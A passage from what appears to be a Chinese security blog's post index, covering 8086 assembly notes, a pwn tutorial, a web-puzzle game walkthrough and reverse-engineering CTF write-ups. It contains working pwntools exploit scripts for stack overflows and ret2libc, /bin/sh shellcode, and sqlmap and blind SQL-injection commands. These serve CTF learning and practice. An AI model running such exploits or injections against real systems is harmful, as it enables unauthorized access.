RAM单元的地址；71h为数据端口，存放从选定的CMOS单元中读取的数据，或要写入到其中的数据。CPU对CMOS的读写分两步进行，读CMOS的2号单元：①将2送入端口70h；②从端口71h读出2号单元的内容\n\n在CMOS中，存放这当前的时间：年、月、日、时、分、秒。这6个信息的长度都为1个字节。存放单元为：秒：0\t\t分：2\t\t时：4\t\t日：7\t\t月：8\t\t年：9\n\n这些数据以BCD码的方式存放。BCD码是以4位二进制数表示十进制数码的编码方法。数值26，用BCD码表示为：0010 0110\n\n1个字节表示2个BCD码，高4位的BCD码表示十位，低4位的BCD码表示个位。\n\n编程，在屏幕中间显示当前的月份\n\n```asm\nassume cs:code\ncode segment\nstart:\tmov al,8\t\t\n\t\tout 70h,al\t\t\t;从8号单元读出当前月份的BCD码\n\t\tin al,71h\t\t\t;从数据端口71h中取得指定单元中的数据\n\t\t\n\t\tmov ah,al\t\t\t;al中为从CMOS的8号单元中读出的数据\n\t\tmov cl,4\n\t\tshr ah,cl\t\t\t;ah中为月份的十位数码值\n\t\tand al,00001111b\t;al中为月份的个位数码值\n\t\t\n\t\tadd ah,30h\n\t\tadd al,30h\t\t\t;显示对应的ASCII码字符\n\t\t\n\t\tmov bx,0b800h\n\t\tmov es,bx\n\t\tmov byte ptr es:[160*12+40*2],ah\t\t;显示月份的十位数码\n\t\tmov byte ptr es:[160*12+40*2+2],al\t\t;显示月份的个位数码\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n# 15. 外中断\n\n外设输入不直接送入内存和CPU，而是送入相关的接口芯片的端口中；CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关芯片送到外设。\n\n在PC系统中，外中断源一共有以下两类：\n\n1. 可屏蔽中断\n\n可屏蔽中断是CPU可以不响应的外中断。CPU是否响应要看标志寄存器的IF位。如果IF=1，CPU在执行完当前指令后响应中断，引发中断过程；如果IF=0，不响应可屏蔽中断。\n\n8086CPU提供设置IF的指令如下：\n\n```asm\nsti\t\t;设置IF=1\ncli\t\t;设置IF=0\n```\n\n2. 不可屏蔽中断\n\n不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。对于8086CPU，不可屏蔽中断的中断类型码固定为2，所以中断过程中，不需要取中断类型码。则不可屏蔽中断的中断过程为：\n\n①标志寄存器入栈，IF=0，TF=0\n\n②CS、IP入栈\n\n③(IP)=8，(CS)=(0ah)\n\n\n\n","categories":["Windows逆向"],"tags":["汇编"]},{"title":"pwn基础入门","url":"/posts/1c971db4.html","content":"\n先存个档。\n\n<!--more-->\n\n# 1. Linux入门\n\n| 命令            | 含义                            | 示例                     |\n| --------------- | ------------------------------- | ------------------------ |\n| pwd             | 输出当前路径                    | pwd                      |\n| ls              | 列出位于当前路径的文件          | ls -al                   |\n| cd xxx          | 改变当前路径，前往xxx目录       | cd ~/workspace           |\n| cat xxx         | 直接展示xxx文件的内容           | cat hw.c                 |\n| *** \\| grep xxx | ***是其他命令，输出含有xxx的行  | cat hw.c \\| grep stdio.h |\n| *** \\| less     | 查看输出更舒服，jk上下移动q退出 | cat hw.c \\| less         |\n| ./xxx           | 运行当前目录xxx可执行文件       | ./a.out                  |\n\n# 2. 汇编基础\n\n 内存地址：在有段/偏移寄存器的语境下一般记为`段:偏移`，如`CS:IP`,`SS:IP`,`SS:BP`,`DS:DI`,`DS:SI`,`DS:[]`\n$$\n一个内存地址=段地址×16+偏移地址\\\\\n1234h:ABCDh=12340h+ABCDh=1CF0Dh\n$$\n小端序：低地址存放低位数据\n\n一个程序的内存空间：\n\n| 高地址 | OS Kernel Space  |\n| ------ | :--------------: |\n|        |      Stack       |\n|        |     ↓(blank)     |\n|        | Shared Libraries |\n|        |     ↑(blank)     |\n|        |       Heap       |\n|        |       BSS        |\n|        |  Data(RW)数据段  |\n|        |  Text(RX)代码段  |\n| 低地址 |     (blank)      |\n\n栈：\n\n|   SS:SP 栈顶   |\n| :------------: |\n| SS:BP 栈帧基底 |\n|    SS 栈底     |\n\n寄存器总结\n\n| name | 用途                     | name                        | 用途                 |\n| ---- | ------------------------ | --------------------------- | -------------------- |\n| AX   | 通常用来存放函数的返回值 | SS(Stack Seg)               | 栈的段地址/基地址    |\n| CX   | 通常用来做循环计数器     | CS(Code Seg)                | 下一条指令的段地址   |\n| BX   |                          | DS(Data Seg)                | 数据的段地址         |\n| DX   |                          | **SP(Stack Pointer)**       | 栈顶偏移地址         |\n|      |                          | **BP(Base Pointer)**        | 栈的基址偏移地址     |\n|      |                          | **IP(Instruction Pointer)** | 下一条指令的偏移地址 |\n\n汇编指令\n\n![汇编指令](F:\\markdown图片\\pwn知识点\\汇编指令.png)\n\n# 3. 程序装载与栈帧结构\n\n在Linux的可执行文件ELF\n\nELF文件类型：\n\n- Relocatable File(*.o)：可重定位文件，用来链接的素材\n- Executable File(*)：可执行文件\n- Shared Object File(*.so)：共享目标文件，用于做动态链接库\n\n# 4. 实战环境配置和工具介绍\n\n连接远程服务器：\n\nnc表示netcat\n\n```\nnc node4.buuoj.cn 28487\n```\n\n使用file查看文件信息，checksec查看文件保护信息。\n\n{% asset_img checksec.png 文件信息 %}\n\n利用gdb调试ELF文件：\n\n| 命令      | 简写 | 说明                                                         |\n| --------- | ---- | ------------------------------------------------------------ |\n| file      |      | 装载一个文件，可以在gdb后加参数，效果等同                    |\n| kill      |      | 终止当前调试的进程                                           |\n| run       | r    | 运行当前装载的文件，运行过程中使用Ctrl + C退出程序交互，进入调试(在退出时位置) |\n| next      | n    | =step over 单步步过                                          |\n| step      | s    | =step into 单步步入                                          |\n| continue  | c    | 继续执行程序，直到下一个中断或程序结束                       |\n| finish    | fini | 运行到函数返回处                                             |\n| catch     |      | 设置捕捉点                                                   |\n| thread    | t    | 查看当前程序的线程信息                                       |\n| break     | b    | 在当前位置设置断点                                           |\n| backtrace | k    | 查看当前函数调用栈信息                                       |\n| stack     |      | stack n 查看栈内容                                           |\n| vmmap     |      | 查看程序中的分段，相当于OD中的`E`模块                        |\n\n# 5. 缓冲区溢出\n\n编写程序时没有考虑或错误设置用户输入长度，导致用户向缓冲区输入长度超过接受变量长度，从而覆盖到其它正常数据，破坏栈帧结构。\n\n缓冲区溢出常见的漏洞函数：\n\n```c\nchar *gets(char *str);\n\nint read(int handle, void *buf, int len);\n\nint scanf(const char *format, ...);\n\nint getchar(void);\n\nint printf(const char *restrict format, ...);\n```\n\n如果文件中有\"/bin/sh\"，可用以下脚本：\n\n```python\nfrom pwn import *\ncontext(log_level='debug', os='linux', arch='amd64', bits=64)\ncontext.terminal = ['/usr/bin/x-terminal-emulator', '-e']\n\n# Interface\nlocal = True\nbinary_name = 'filename'\nport = 12345\n\nif local:\n    p = process([\"./\" + binary_name])\n    e = ELF('./' + binary_name)\n    # libc = ELF('e.libc')\nelse:\n    p = remote(\"ctf.spaceskynet.top\", port)\n    e = ELF(\"./\" + binary_name)\n    # libc = ELF(\"libc-2.23.so\")\n   \ndef z(a=''):\n    if local:\n        gdb.attach(p, a)\n        if a == '':\n            raw_input()\n        else:\n            pass\nru = lambda x: p.recvuntil(x)\nrc = lambda x: p.recv(x)\nsl = lambda x: p.sendline(x)\nsd = lambda x: p.send(x)\nsla = lambda delim, data: p.sendlineafter(delim, data)\n\n# main\nif __name__ == \"__main__\":\n    z('b foo')\t\t#在foo函数下断\n    # 如果直到backdoor和binsh的地址可直接写地址\n    # backdoor = 0x08049172\n    # bin_sh = 0x0804A008\n    backdoor = e.symbols['backdoor']\t#参数为函数名字\n    bin_sh = next(e.search(b'/bin/sh')) #在ELF文件中找/bin/sh\n    main_addr = e.symbols['main']\n    payload = b'a' * 0x1c + p32(backdoor) + p32(main_addr) + p32(bin_sh)\t# 即执行完backdoor函数后返回到main函数\n    sl(payload)\n    p.interactive()\n```\n\n# 6. Shellcode\n\nshellcode就是能使程序调用shell的一段代码(通常为汇编级别/机器码)。一旦某种shellcode被执行，我们就能够拿到目标机器的控制权限，从而获取flag。\n\n- system(\"/bin/sh\");（？） -> execve(\"/bin/sh\", 0, 0)\n- 触发中断(int 0x80 / syscall)\n\n```asm\n; first.asm\n; first get shell test in pwn class\n; nasm -f elf32 first.asm\n; ld -m elf_i386 -o getShell first.o\n; objump -d getShell\n\nglobal _start\n_start:\n\tpush \"/sh\"\n\tpush \"/bin\"\n\tmov ebx, esp\n\txor edx, edx\n\txor ecx, ecx\n\tmov al, 0xb\n\tint 0x80\n```\n\nShellcode脚本：\n\n```python\nfrom pwn import *\n\nif __name__ == '__main__':\n    context(os='linux', arch='amd64', bits=64)\n    payload1 = asm(shellcraft.sh())\n    My_Shellcode = \"\"\"\n    mov rbx, 0x68732f6e69622f\n    push rbx\n    push rsp\n    pop rdi\n    xor esi, esi\n    xor edx, edx\n    push 0x3b\n    pop rax\n    syscall\n    \"\"\"\n    payload2 = asm(My_Shellcode)\n    p = process('./mrctf2020_shellcode')\n    # p = remote('node3.buuoj.cn', 25266)\n    # p.sendline(payload1)\n    p.sendline(payload2)\n    p.interactive()\n```\n\n# 7. ROP链构造\n\nNX——NO Execute bit(禁止执行位)是应用在CPU上的安全技术，它支持了操作系统级别的DEP——Data Execute Prevention(数据执行保护，Microsoft)。在应用了NX的系统上，(如果可执行文件开启保护)，会把内存中的区域分为只供存储指令和只供存储数据两种。NX bit 被标记在内存分页中使用的页表索引上，如果置1，则该页内存数据不允许被执行，即把所有内容作为数据处理。这样可以防范shellcode注入攻击。\n\nROP——Return-Oriented Programming(返回导向编程)技术，允许攻击者在开启了栈不可执行等安全保护技术的情况下，执行恶意代码。\n\n核心思想是通过栈溢出等方式，改写栈上的控制信息(调用栈，即return address, rbp等)，以控制调用栈，劫持程序控制流并执行一些针对性的命令序列(gadgets)。\n\ngadgets主要指一些以ret结尾的小段汇编指令，它们的执行通过ret语句和栈上控制的返回地址相连，构成一条ROP链。链的功能是设置寄存器值，泄露信息，调用函数等。\n\n## 7.1 Ret2Text\n\ngadget一般存在于Text中，或者广义上存在于ELF文件中(指令部分)。将返回地址改写为能执行某些特定功能的gadget地址，构造ROP链。\n\n辅助工具：ropper、pwntools(ELF class)\n\n```python\nfrom pwn import *\ncontext(log_level='debug', os='linux', arch='amd64', bits=64)\ncontext.terminal = ['/usr/bin/x-terminal-emulator', '-e']\n\n# Interface\nlocal = True\nbinary_name = 'filename'\nport = 12345\n\nif local:\n    p = process([\"./\" + binary_name])\n    e = ELF('./' + binary_name)\n    # libc = ELF('e.libc')\nelse:\n    p = remote(\"ctf.spaceskynet.top\", port)\n    e = ELF(\"./\" + binary_name)\n    # libc = ELF(\"libc-2.23.so\")\n   \ndef z(a=''):\n    if local:\n        gdb.attach(p, a)\n        if a == '':\n            raw_input()\n        else:\n            pass\nru = lambda x: p.recvuntil(x)\nrc = lambda x: p.recv(x)\nsl = lambda x: p.sendline(x)\nsd = lambda x: p.send(x)\nsla = lambda delim, data: p.sendlineafter(delim, data)\n\n# main\nif __name__ == \"__main__\":\n    # backdoor = e.plt['system']\n    backdoor = e.symbols['backdoor']\t#参数为函数名字\n    bin_sh = next(e.search(b'/bin/sh')) #在ELF文件中找/bin/sh\n    poprdi = 0x4011eb\n    payload = b'a' * 0x10 + b'b' * 0x08 + p64(poprdi) + p64(bin_sh) + p64(backdoor)\t# 将当前rdi的值扔掉，bin_sh的地址赋给rdi，作为参数调用backdoor中的system\n    sl(payload)\n    p.interactive()\n```\n\n如果文件中没有system函数，如果想要调用system函数，要利用到PLT表。\n\n## 7.2 Ret2syscall\n\n- 一般为静态链接的可执行文件，指令非常多，也提供了许多gadget\n\n\n- 最核心gadget：syscall(int 0x80)\n\n\n- 整体类似Shellcode注入\n\n{% asset_img 7.2.1.png 静动态链接 %}\n\n静态链接的ELF文件在IDA的函数窗口全是一片白，没有粉色的动态链接。\n\n利用ROPgadget工具，自行生成ROP链。\n\n## 7.3 PLT表和GOT表\n\n[GOT表和PLT表](https://blog.csdn.net/qq_52126646/article/details/119494939)\n\n这里的PLT表示`.plt`，GOT表表示`.got.plt`。`.got`存放其它全局符号信息，与`.got.plt`不同，与`.plt`关系不大。\n\n## 7.4 Ret2libc\n\n- 对动态链接文件，一般链接glibc\n\n\n- glibc链接基址未知，需要进行基址泄露\n\n\n- 一般需要程序循环，可以通过ROP链构造循环\n\n```python\nfrom pwn import *\ncontext(log_level='debug', os='linux', arch='amd64', bits=64)\ncontext.terminal = ['/usr/bin/x-terminal-emulator', '-e']\n\n# Interface\nlocal = True\nbinary_name = 'filename'\nport = 12345\n\nif local:\n    p = process([\"./\" + binary_name])\n    e = ELF('./' + binary_name)\n    # libc = ELF('e.libc')\nelse:\n    p = remote(\"ctf.spaceskynet.top\", port)\n    e = ELF(\"./\" + binary_name)\n    # libc = ELF(\"libc-2.23.so\")\n   \ndef z(a=''):\n    if local:\n        gdb.attach(p, a)\n        if a == '':\n            raw_input()\n        else:\n            pass\nru = lambda x: p.recvuntil(x)\nrc = lambda x: p.recv(x)\nsl = lambda x: p.sendline(x)\nsd = lambda x: p.send(x)\nsla = lambda delim, data: p.sendlineafter(delim, data)\n\nprdi = 0x400c83\npenc = 0x4009a0\n# main\nif __name__ == \"__main__\":\n    z('b *0x4009d1\\nb *0x400aee')\n    sla('choice',b'1')\n    payload = b'a' * 0x50 + b'b' * 0x08 + p64(prdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(penc)\t# 泄露puts函数地址\n    sla('encrypted', payload)\t\n    \n    ru(b'\\x40\\x0a')\n    log.info('start detecting libc address')\n    libc_puts = u64(p.recvuntil(b'\\x0a', drop=True).ljust(8, b'\\x00'))\n    log.success('libc puts address found:' + hex(libc_puts))\n    libc = LibcSearcher('puts', libc_puts)\n    # libc.symbols['puts']\n    \n    # libc.select_libc(0)\n    libc_addr = libc_puts - libc.dump('puts')\n    \n    rtn_addr = 0x400b27\n    payload = b'a' * 0x50 + b'b' * 8\n    for i in range(1):\n        payload += p64(rtn_addr)\t# for align\n    payload += p64(prdi) + p64(libc_addr + libc.dump(\"str_bin_sh\")) + p64(libc_addr + libc.dump(\"system\"))\n    sla('encrypted', payload)\n    \n    p.interactive()\n```\n\n# 8. ELF保护措施及绕过方法\n\n## 8.1 ASLR\n\nASLR(Address space layout randomization)——地址空间配置随机化\n\n将可执行文件、共享库、栈、堆的基址随机化，用于防范明确地址的内存破坏攻击，比如ret2libc、stack address。\n\n应对方法：地址泄露\n\n## 8.2 NX\n\n看[7.ROP链构造]\n\n## 8.3 PIE\n\nPIE(Position-independent executable)——地址无关代码/可执行文件\n\n无论文件被加载进内存空间的什么地址中，程序都能够正常运行。在共享库链接中有重要作用。共享库文件被动态链接到内存中，PIE使其能正确处理外部引用。在普通ELF文件上，ELF配合ASLR，使其基址不可预测，增加了攻击难度。\n\n整个ELF文件都会被装载进一个随机偏移的连续内存空间里，只有基址变成了未知，其它都是相同的。\n\n应对方法：Partial Writing\n\n程序的加载以内存页(4K)为单位，基地址后3位(hex)一定为0，同一文件被加载进连续地址中。\n\n一般利用Return Address控制跳转，可通过栈上已有地址，只修改最低3位(2B，4位)值，控制转向\n\n## 8.4 Canary\n\nCanary(Canary in a coal mine)——金丝雀\n\n一串随机数据，放置在栈数据和控制信息之间，函数开始时被放入，退出前检验，若被修改立即终止程序，极大地防范了栈溢出攻击。\n\n应对方法：Canary Leak\n\n- 覆盖栈到Canary处，利用puts等函数泄露地址\n- Canary最低字节为0，防止连带输出\n\n小技巧：`scanf(\"%d\");`输入\"+\"不覆盖内存数据\n\n# 9. Stack Pivot\n\n假如可供泄露空间过少，或者需要整段可控的栈空间，这就需要使栈帧移向可控栈空间，控制程序执行流转向。","categories":["漏洞渗透"],"tags":["CTF","Pwn"]},{"title":"黑客丛林之旅小游戏","url":"/posts/9589547b.html","content":"[黑客丛林之旅](http://www.fj543.com/hack/)\n\n1-http://www.fj543.com/hack/?level=1\n\n> 提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) \n\n<!--more-->\n\n```html\n<script type=\"text/javascript\">\nfunction gogogo(){\n\tvar pwd=document.getElementById(\"pass\").value;\n\tif (pwd==\"go8990\") {alert(\"OK,过关了！\");window.location=\"./?level=222\";} else {alert(\"Error:密码错误！\");document.getElementById(\"pass\").focus();}\n}\n</script>\n```\n\n2-http://www.fj543.com/hack/?level=222\n\n> 提示语：这讨厌的脚本，为什么阻止我！(I hate the script,it prevents me) \n\n```html\n<script type=\"text/javascript\">\nfunction chkPassword(){\n\tvar pwd=document.getElementById(\"pass\").value;\n\tif (pwd==\"\") {alert(\"Error:密码不能为空！(Input password please)\");}else{alert(\"Error:密码不能填东西！(Don't input password please)\");} //无论输入什么内容,就是不让你提交！\n\treturn false;\n}\n</script>\n<form action=\"./\" method=\"post\" onsubmit=\"return chkPassword()\">\n输入密码进入下一关 (Input password please)<br>\n<input type=\"password\" name=\"pass\" id=\"pass\" value=\"\">\n<input type=\"hidden\" name=\"act\" id=\"act\" value=\"pass2\">\n<input type=\"submit\" value=\"Go\">\n</form>\n```\n\nscript标签里的东西改不了，将表单的`return chkPassword()`删掉即可。\n\n3-http://www.fj543.com/hack/?level=3login\n\n> 您还没有登录，所以看不到本页的秘密。(You must login to see the secret of this level) \n>\n> 提示语：这该死的网页，凭什么说我没有登录？(Damn page! Why you say that I didn't login?)  \n\n在cookie管理器或抓包改cookie，no改成yes即可。\n\n```\nCookie: ASPSESSIONIDCSSDDSRA=KDLFDAJCJMFKCDDFPJOBMEFA; Hm_lvt_ddc172cd878cb9d6da5a109ab508be16=1631447102; Hm_lpvt_ddc172cd878cb9d6da5a109ab508be16=1631447282; guoguan=2; login=no\n```\n\n4-http://www.fj543.com/hack/?level=4ditdah\n\n```\n. .\n. _\n_ _\n_ _ _\n_ . _\n提示语：向嘀嗒嘀嗒的电子时代老一辈黑客们致敬。(Tribute to the early hackers)  \n```\n\n 摩斯电码`IAMOK`\n\n5-http://www.fj543.com/hack/?level=5crack\n\n> 提示语：用流行的加密算法把密码加密成YmFzZTY0aXNvaw==或ad93c1d102ae60f4的形式并不可靠。(Encrypting a password by a popular encryption method is not secure)  \n\n`YmFzZTY0aXNvaw==`有大小写和等号，考虑base64`base64isok`\n\n`ad93c1d102ae60f4`是MD5`520530`，但用`520530`过不了关？？？\n\n6-http://www.fj543.com/hack/?level=6por\n\n>  if mstsc+vnc=9290 then password=MSSQL+MySQL+Oracle\n>  password= ？\n>\n>  提示语：有些常见的数字要记住。(You should remember some numbers)  \n\n常见端口号：\n\n```\nmstsc:3389\nvnc:5901\nMSSQL:1433\nMySQL:3306\nOeacle:1521\n```\n\npassword=1433+3306+1521=6260\n\n7-http://www.fj543.com/hack/?level=75901\n\n> 提示语：眼花缭乱了吧，看电视的时候怎么不会啊！(The password is about a TV program)  \n\n一张GIF动图，拿去`Stegsolve`把它拆了analyse->frame browser，拆成6张图，组合起来为`8bIGNOREwmUPPERCASEqneWORDS`，大写字母的意思是`ignore upper words`忽略大写字母，所以正确答案为`8bwmqne`。\n\n8-http://www.fj543.com/hack/?level=8bwmqne\n\n> 吴世昌的弟弟的网名是什么？(What's the username of WuShichang's little brother) \n>\n> 提示语：小小社工，过这一关主要靠人脑，电脑只是辅助。(Social Engineering.Use your brain more,and use computer less) \n\n吴世昌的弟弟叫吴其昌，吴世昌的网名fj543，推测吴其昌的网名为`fj573`\n\n9-http://www.fj543.com/hack/?level=91ie543\n\n> 提示语：使用IE 5.43版本的浏览器访问?level=9token可以得到令牌。(Use IE 5.43 version to browse ?level=9token) \n\n抓包改URL和浏览器\n\n```\nGET /hack/?level=91ie543 HTTP/1.1\nHost: www.fj543.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\n```\n\n改为\n\n```\nGET /hack/?level=9token HTTP/1.1\nHost: www.fj543.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 IE 5.43\n```\n\n` 您的令牌(Token):level9495216 `\n\n回到原来的URL输入令牌。\n\n10-http://www.fj543.com/hack/?level=g1012495216\n\n> 提示语：请下载[令牌生成器(Token Generator)](http://www.fj543.com/hack/files/10token.zip)。解压密码不长,但很复杂。(Download it.The zip password is short,but very complex)  \n\n去winhex查一下是不是真加密，真加密就爆破zip，结果为`o0_O`。输入密码，执行exe程序生成口令。但当我们点击`aux.10.txt`后它说找不到文件，用什么文字编辑器都打不开。wp说它属于特殊文件名，只能用cmd打开：\n\n```\n#type指令打开常规方法无法打开的文件\ntype \\\\.[txt文件的绝对路径]\ntype \\\\.\\C:\\Users\\dell\\Desktop\\10token\\aux.10.txt\n你的令牌(Token):key104957591\n只在今天有效(It's available only today)\n```\n\n11-http://www.fj543.com/hack/?level=lv11\n\n> 提示语：一个表情，却是有声有色。(I like the beautiful face and the voice) \n\n用winhex打开看到字符串\n\n> GIF89a……--------------------password end,and password start--------------------RIFF$WAVEfmt\n\n前面是GIF图片，后面RIFF$WAVEfmt是音频文件格式。用winhex将前面的GIF部分删除，剩下的另存为.wav文件，音频说`表情加上6688`，我的是微笑表情，所以`smile6688`通过。\n\n12-http://www.fj543.com/hack/?level=g1213495759\n\n> 您需要获取两个临时ID的认证，才能看到本关的秘密！(You should get two Authentication)\n> 1.下载第12关认证软件，用它申请认证一个软件临时ID.(Download it. And use it to Authenticate the TempID of software)\n> 2.回到此窗口，想办法手工申请认证你的网页临时ID.(Then back to this window.Try to Authenticate the TempID of web)\n>\n> 提示语：你的网页临时ID是191.半小时内有效，若失效请刷新网页。(This is your TempID of web) \n\n下载解压后win10一定一定要以管理员身份运行，否则根本打不开！\n\n> 临时ID：455\n>\n> 在线认证开始(Started)\n>\n> 验证第一步(step1)...Step1 ok\n>\n> 验证第二步(step2)...Step2 ok\n>\n> 已完成软件临时ID的认证。接下来请回到浏览器中申请网页临时ID的认证。(Software TempID is authenticated.Please back to the browser window.Try to Authenticate the TempID of web)\n\n什么都没有，就给了个临时ID，先用winhex打开看看\n\n> User-Agent: Mozilla/4.0 (compatible; HackersGameBrowser)\n>\n> http://www.fj543.com/hack/  寶翄,{Nek(step1)  ?act=step1&code=  寶翄,{孨ek(step2)  ?act=step2&code=  step1ok step2ok\n\n可以看到关键信息`?act=step1&code=`和`?act=step2&code=`，提交链接应该就是这些。\n\n先把刚才的软件临时ID构造`http://www.fj543.com/hack/?act=step1&code=455`，但会出现以下错误：\n\n> Error:你的临时ID应该是162.(Your TempID should be this one) \n\n抓包把User-Agent换成上面那个就可以了。\n\n>  Step1 ok \n\n接下来获取第二个临时ID，猜测`http://www.fj543.com/hack/?act=step2&code=455`显示\n\n>  Error:Bad Code \n\n现在已知code总是3位数，那就直接爆破。有些code都返回了`Step2 ok`但怎么进去下一关啊？感觉是bug。找到状态302，就是正确code，在URL上打就刷新出第13关入口。\n\n13-http://www.fj543.com/hack/?level=13sql\n\n> 你的ID是(Your ID)： 154 \n> 你的密码(Your password)： \n>\n> 提示语：请从/hack/13sql.asp挖掘出这个ID对应的密码。(Try to find the password for the ID)  \n\n去到http://www.fj543.com/hack/13sql.asp\n\n> 这是一个数据库信息查证页面，提交一个ID，会显示查询结果。(Submit an ID,then it will show you the query result)\n>\n> 数据库中有这条信息,但我不能直接告诉你密码。(The data exists.But I can't show you the password)  \n\nPOST形式的SQL注入，也可以用sqlmap自动化注入，参数可以抓包看\n\n```\nsqlmap -u http://www.fj543.com/hack/13sql.asp --data=\"id=154&password=111\" --batch\nsqlmap -u http://www.fj543.com/hack/13sql.asp --data=\"id=154&password=111\" --batch --tables\n```\n\n自动化注入好像不行，开始手注。\n\n输入1\n\n>  数据库中有这条信息,但我不能直接告诉你密码。 \n\n输入1 and 1=1\n\n>  数据库中有这条信息,但我不能直接告诉你密码。 \n\n输入-1\n\n>  没有找到此ID对应的内容。 \n\n输入-1 or 1=1\n\n>  数据库中有这条信息,但我不能直接告诉你密码。 \n\n反正就不告诉我，普通手注从网页中返回不了有效信息，大佬们wp中的思路：猜密码的字段名为pwd，构造`154 and pwd like '%a%'`，抓包，将\\$a$暴力破解。我猜意思是pwd是由暴力破解得出的字符组成的。\n\n> id=154+and+pwd+like+%27%25a%25%27\n>\n> id=154+and+pwd+like+%27%25\\$a$%25%27\n\n破解发现`bdguvBDGUV`都有，我猜密码是5个字符，不区分大小写。\n\n```python\nimport itertools\nf = open(\"bdguv.txt\", \"w\")\n\nfor i in itertools.permutations('bdguv', 5):\n    c = ''.join(i)\n    f.write(c+'\\n')\n\nf.close()\n```\n\n回到`http://www.fj543.com/hack/?level=13sql`抓包，设置参数用bdguv.txt爆破。返回状态302的即是正确密码。\n\n14-http://www.fj543.com/hack/?level=14crack\n\n令牌下载下来的名字`file.exe.html`，将html删去，运行一下，让我们输入密码。扔去OD看看字符串：右键->中文搜索引擎->智能搜索\n\n可以看到一些奇怪的字符串，组合起来为`love543`，估计这个就是密码，输入就可得到令牌。\n\n通关。","categories":["综合"],"tags":["CTF","Web"]},{"title":"攻防世界 逆向高手进阶区","url":"/posts/5a99a36.html","content":"\n新手练习区完结，高手进阶区有些也做过了。如果在这里找不到笔记，请到[小凉的CSDN博客](https://blog.csdn.net/Leong_Vinson)去找，如果没有那就真没有了。\n\n<!--more-->\n\n# 1. secret-string-400\n\n下载下来是个`.gz`文件，拖进kali解压，发现又是一个压缩文件，继续解压。\n\n```\n                    \n┌──(v5le0n9㉿kali)-[~/Desktop]\n└─$ gzip -d secret.gz  \n                                                                             \n┌──(v5le0n9㉿kali)-[~/Desktop]\n└─$ file secret\nsecret: POSIX tar archive\n                                                                             \n┌──(v5le0n9㉿kali)-[~/Desktop]\n└─$ tar -xvf secret\n./._Task.html\nTask.html\n./._Machine.js\nMachine.js\n```\n\n解压出来一个html文件和一个js文件。打开html文件输入字符串试试，啥都没有。要我们输入一个无效字符串才可以得到flag。\n\n{% asset_img 1.1.png 输入字符串 %}\n\n打开js分析check()函数。\n\n{% asset_img 1.2.png js代码 %}\n\nloadcode()用来加载aardio代码，或一个aardio代码文件，并创建一个函数对象。函数原型：\n\n```\n函数对象,错误信息 = loadcode(codeString | filepath)\n```\n\n参数可以是包含aardio代码的字符串值，也可以是aardio代码文件的路径。路径可以用斜杠作为首字符表示应用程序根目录。该函数并不立即执行代码，而是返回一个函数对象。如果加载代码失败，则返回的函数对象为null值，并在第二个返回值中返回错误信息。\n\n所以那些数字其实是aardio代码。先去到run函数看看。\n\n{% asset_img 1.3.png js代码 %}\n\n{% asset_img 1.4.png js代码 %}\n\n救...js我实在不会啊！看了牛牛们的wp，通过修改js文件将命令参数打印在Console中。在run函数中加入代码：\n\n```javascript\nconsole.log('new Opcode' + command.args)\n```\n\n{% asset_img 1.5.png js代码 %}\n\n运行一下，在Console中就可以看到被解析出来的代码了。\n\n{% asset_img 1.6.png console %}\n\n```javascript\nvar f=window.machine.registers[1].userinput//\nvar i = f.length//\nvar nonce = 'groke';//\nvar j = 0;//\nvar out = [];//\nvar eq = true;//\nwhile(j < i){//\n\tout.push(f.charCodeAt(j) ^ nonce.charCodeAt(j%5))//\n\tj++;//\n}//\nvar ex =  [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];//\nif (ex.length == out.length) {//\n\tj = 0;//\n\twhile(j < ex.length){//\n\t\tif(ex[j] != out[j])//\n\t\t\teq = false;//\n\t\tj += 1;//\n\t}//\n\tif(eq){//\n\t\talert('YOU WIN!');//\n\t}else{\n\t\talert('NOPE!');\n\t}\n}else{alert('NOPE!');}//\n```\n\n这些代码我就看懂了。输入的长度与ex长度要相等，经过异或算法最终要与ex中的元素相等。马上编写逆向脚本：\n\n```python\nex =  [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60]\nnonce = list('groke')\nflag = \"\"\nfor i in range(len(ex)):\n    flag += chr(ex[i] ^ ord(nonce[i%5]))\nprint(flag)\n'''\nflag is: WOW_so_EASY\n'''\n```\n\n```\nWOW_so_EASY\n```\n\n原来这就是Web逆向嘛，呜呜呜呜js硬伤啊\n\n# 2. Newbie_calculations\n\n运行一下，发现输入不了任何东西。载入OD，发现每隔一段时间暂停一下它会停在不同的地址，说明这个程序一直在运行，而不是等待我们输入。\n\n载入IDA查看伪代码，发现它在不停地调用这几个函数。\n\n{% asset_img 2.1.png IDA分析 %}\n\n一个个进去看，反编译乱死了...\n\n{% asset_img 2.2.png IDA分析 %}\n\n{% asset_img 2.3.png IDA分析 %}\n\n{% asset_img 2.4.png IDA分析 %}\n\n知道每个函数的作用后，抄一遍代码：\n\n```python\ndef mul_401100(a,b):\n    return a*b\ndef sub_401220(a,b):\n    return a-b\ndef add_401000(a,b):\n    return a+b\nflag=[1 for i in range(32)]\nv121 = 0\nprint(\"Your flag is:\")\nv3 = mul_401100(flag[0], 0x3B9ACA00)\nv4 = sub_401220(v3, 0x3B9AC9CE)\nflag[0]=mul_401100(v4, 2)\nv5 = add_401000(flag[1], 0x4C4B40)\nv6 = sub_401220(v5, 0x65B9AA)\nv7 = add_401000(v6, 1666666)\nv8 = add_401000(v7, 45)\nv9 = mul_401100(v8, 2)\nflag[1]=add_401000(v9, 5)\nv10 = mul_401100(flag[2], 0x3B9ACA00)\nv11 = sub_401220(v10, 999999950)\nv12 = mul_401100(v11, 2)\nflag[2]=add_401000(v12, 2)\nv13 = add_401000(flag[3], 55)\nv14 = sub_401220(v13, 3)\nv15 = add_401000(v14, 4)\nflag[3]=sub_401220(v15, 1)\nv16 = mul_401100(flag[4], 100000000)\nv17 = sub_401220(v16, 99999950)\nv18 = mul_401100(v17, 2)\nflag[4]=add_401000(v18, 2)\nv19 = 